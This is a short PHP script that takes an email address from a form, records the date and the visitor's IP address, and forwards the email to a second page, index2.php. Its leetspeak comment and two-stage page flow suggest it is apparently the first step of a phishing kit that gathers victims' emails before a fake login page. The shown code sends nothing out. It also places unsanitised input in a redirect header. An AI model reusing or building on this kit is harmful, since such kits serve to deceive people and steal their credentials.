<?php

$t1=$_POST["email1"];
$null1 = "";
$Datex=date("D d M, Y");
$Ipx = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);

if ($t1 == $null1) {
			//back to HTML 1
			header('Location: index.html');

	} else {

		// 3ma1l

// HTML 2
header('Location: index2.php?email='.$t1);

}

?>